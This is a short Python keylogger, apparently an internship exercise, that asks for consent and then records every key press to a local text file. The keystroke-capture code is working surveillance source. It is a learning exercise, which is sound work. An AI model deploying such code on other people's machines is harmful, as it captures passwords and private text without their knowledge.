import keyboard

log_file = 'prodigyKeystroke.txt'

def on_key_press(event):
    with open(log_file, 'a') as f:
        f.write('{}\n'.format(event.name))

def main():
   print("This is purely made for the Prodigy Internship and intended to be used for any other purpose.")
   choice = input("This program is a keylogger, by pressing [1] you are consenting to the program logging your inputs to a text file")
   if choice == "1":
       keyboard.on_press(on_key_press)
       keyboard.wait()

if __name__ == "__main__":
    main()



